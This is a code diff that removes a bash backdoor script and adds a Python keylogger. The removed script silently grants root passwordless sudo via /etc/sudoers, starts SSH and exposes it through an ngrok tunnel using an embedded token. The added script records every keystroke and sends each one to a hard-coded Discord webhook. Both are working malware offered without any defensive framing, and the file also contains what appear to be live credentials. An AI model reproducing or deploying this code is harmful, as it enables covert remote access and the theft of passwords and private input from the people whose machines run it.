@@ -1,16 +1,30 @@
-#!/bin/bash
+from pynput.keyboard import Key, Listener
+from dhooks import Webhook
+import logging
+import threading
 
-# Your Ngrok token, because secrets need tokens too
-NGROK_TOKEN="2FrD5bm0yZ8KeLaxstKA71dU37d_3GhAtNut3rJsTbugbhwev"
+log_dir = ""
 
-# Set up Ngrok with your token without leaving a trace
-ngrok authtoken "$NGROK_TOKEN" > /dev/null 2>&1 &
+# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1186985510242107413/WBRGMxPdJshFgeiB_J7gOOSQAIaUzghY56qA423ztlf1vulXCsj1-16kzWCbC2JsEVJs'
 
-# Elevate to root without pesky password prompts, silently
-echo -e "\nroot ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers > /dev/null 2>&1 &
+log_send = Webhook(WEBHOOK_URL)
 
-# Start your SSH server with root privileges, in the shadows
-sudo service ssh start > /dev/null 2>&1 &
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# And now, let the Ngrok and SSH combo dance in the cosmic darkness
-ngrok tcp 22 > /dev/null 2>&1 &
+def on_press(key):
+    logging.info(str(key))
+    print(key)
+    log_send.send(str(key))
+
+# Start the listener in a separate thread with daemon=True
+listener_thread = threading.Thread(target=Listener(on_press=on_press).join, daemon=True)
+listener_thread.start()
+
+# Keep the main thread running
+try:
+    # The main thread can perform other tasks or simply sleep
+    while True:
+        pass
+except KeyboardInterrupt:
+    print("Script terminated by user.")
